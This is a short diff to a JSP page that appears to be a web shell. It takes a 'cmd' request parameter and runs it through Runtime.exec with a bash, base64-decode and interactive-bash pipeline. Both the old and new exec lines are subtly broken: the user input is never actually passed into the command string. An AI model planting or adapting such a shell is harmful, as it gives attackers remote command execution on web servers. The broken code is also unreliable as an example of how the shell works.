@@ -19,7 +19,7 @@
 <%
 if (request.getParameter("cmd") != null) {
         out.println("Command: " + request.getParameter("cmd") + "<BR>");
-        Process p = Runtime.getRuntime().exec(request.getParameter("bash -c {echo,cmd}|{base64,-d}|{bash,-i}"));
+        Process p = Runtime.getRuntime().exec("bash -c {echo,request.getParameter(cmd)}|{base64,-d}|{bash,-i}");
         OutputStream os = p.getOutputStream();
         InputStream in = p.getInputStream();
         DataInputStream dis = new DataInputStream(in);
